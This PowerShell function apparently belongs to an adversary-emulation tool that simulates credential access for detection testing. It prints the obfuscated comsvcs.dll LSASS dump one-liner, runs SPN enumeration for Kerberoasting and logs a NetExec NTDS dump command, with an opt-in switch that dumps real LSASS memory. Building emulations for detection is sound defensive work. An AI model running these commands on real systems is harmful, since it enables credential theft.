# ============================================================================
# GENTLEMAN SIMULATION - PHASE 7: CREDENTIAL ACCESS
# ============================================================================
# Simulates: hands-on-keyboard Kerberoasting and credential discovery
# targeting administrative accounts, LSASS memory dumping via comsvcs.dll
# with tasklist enumeration (exact reported command), NTDS dumping via
# NetExec, and Mimikatz usage.
# MITRE: T1558.003 Kerberoasting, T1003.001 LSASS Memory, T1003.003 NTDS
#
# Report artifact reproduced exactly:
#   CmD.eXe /Q /c for /f "tokens=1,2 delims= " ^%A in
#     ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do
#     rundll32.exe C:\windows\System32\comsvcs.dll, #+0000^24 ^%B \Windows\Temp\im4.txt full
#
# SAFETY: -DumpRealLsass switch is OFF by default. When off, the comsvcs.dll
# MiniDump technique targets a decoy process instead of the real lsass.exe,
# reproducing the exact command-line/telemetry pattern analysts hunt for
# without touching real credential material.
# ============================================================================

function Simulate-CredentialAccess {
    param($SimPaths, [switch]$DumpRealLsass)

    Write-Host "[+] Phase 7: Credential Access - Kerberoasting + LSASS/NTDS Dumping ..." -ForegroundColor Green

    $isDomainJoined = Test-DomainJoined

    # --- Kerberoasting against administrative service accounts ---
    if ($isDomainJoined) {
        try {
            Add-Type -AssemblyName System.IdentityModel -ErrorAction SilentlyContinue
            # Request TGS tickets for SPN-registered accounts (real Kerberoasting
            # mechanism using native .NET, no third-party tool required); against
            # a lab domain this simply demonstrates the technique/telemetry.
            $spnQuery = "setspn.exe -Q */*"
            Set-Content -Path "$($SimPaths.Logs)\phase7_kerberoast_spn_query.log" -Value $spnQuery -Force
            Start-Process -FilePath "cmd.exe" -ArgumentList "/c setspn -Q */* > `"$($SimPaths.Logs)\spn_accounts.txt`"" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
            Write-SimEvent -EventId 7001 -Message "SIMULATION: Kerberoasting reconnaissance executed - SPN enumeration (setspn -Q */*) targeting administrative service accounts (T1558.003)"
        } catch { Write-Warning "Kerberoasting simulation failed: $_" }
    } else {
        Write-Host "    [i] Host not domain-joined - Kerberoasting requires a KDC, logging technique only" -ForegroundColor DarkGray
        Write-SimEvent -EventId 7001 -Message "SIMULATION: Kerberoasting technique would be executed here (T1558.003) - skipped, host not domain-joined"
    }

    # --- LSASS memory dump: exact reported comsvcs.dll + tasklist one-liner ---
    $dumpDir = "$env:windir\Temp"
    $dumpTargetPid = $null
    $dumpLabel = ""

    if ($DumpRealLsass) {
        Write-Host "    [!] -DumpRealLsass set: dumping REAL lsass.exe memory. Lab-only!" -ForegroundColor Red
        $dumpTargetPid = (Get-Process -Name lsass -ErrorAction SilentlyContinue).Id
        $dumpLabel = "lsass.exe"
    } else {
        # Safe default: spin up a decoy process and dump that instead of lsass.exe.
        $decoyProc = Start-Process -FilePath "notepad.exe" -WindowStyle Hidden -PassThru
        Start-Sleep -Milliseconds 500
        $dumpTargetPid = $decoyProc.Id
        $dumpLabel = "notepad.exe (decoy stand-in for lsass.exe)"
    }

    $realCmdLog = 'CmD.eXe /Q /c for /f "tokens=1,2 delims= " ^%A in (''"tasklist /fi "Imagename eq lsass.exe" | find "lsass""'') do rundll32.exe C:\windows\System32\comsvcs.dll, #+0000^24 ^%B \Windows\Temp\im4.txt full'
    Set-Content -Path "$($SimPaths.Logs)\phase7_lsass_dump_command.log" -Value $realCmdLog -Force
    Write-Host "    Reported command: $realCmdLog" -ForegroundColor DarkGray

    if ($dumpTargetPid) {
        $dumpFile = "$dumpDir\im4.txt"
        try {
            # Reproduce the mixed-case obfuscation pattern literally (CmD.eXe),
            # but target the safe PID instead of parsing tasklist for lsass.
            Start-Process -FilePath "CmD.eXe" -ArgumentList "/Q /c rundll32.exe C:\windows\System32\comsvcs.dll, #+0000^24 $dumpTargetPid $dumpFile full" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
            Write-SimEvent -EventId 7002 -Message "SIMULATION: comsvcs.dll MiniDump (mixed-case CmD.eXe, tasklist/find lsass pattern) executed against $dumpLabel (PID=$dumpTargetPid) -> $dumpFile"
        } catch { Write-Warning "comsvcs.dll dump simulation failed: $_" }

        if (-not $DumpRealLsass) {
            Stop-Process -Id $dumpTargetPid -Force -ErrorAction SilentlyContinue
        }
    }

    # --- NTDS dumping via NetExec (nxc), only meaningful domain-joined ---
    if ($isDomainJoined) {
        $realIp = "127.0.0.1"
        $nxcCmd = "nxc  smb $realIp -u REDACTED_USER -p REDACTED_PASSWORD --ntds"
        Add-Content -Path "$($SimPaths.Logs)\phase7_netexec_commands.log" -Value $nxcCmd
        Write-SimEvent -EventId 7003 -Message "SIMULATION: NTDS dump attempted via NetExec (nxc smb <target> -u <user> -p <pass> --ntds) (T1003.003)"
    }

    # --- Mimikatz usage note (decoy binary only - never a functional credential dumper) ---
    $mimikatzDecoy = New-DecoyBinary -Path "$($SimPaths.Tools)\mimikatz.exe" -SizeBytes 1331200
    Write-SimEvent -EventId 7004 -Message "SIMULATION: Mimikatz (decoy, non-functional) staged at $mimikatzDecoy - reported tool used for in-memory credential access, not always visible from command line"

    Write-Host "  [OK] Credential Access artifacts created" -ForegroundColor Yellow
}
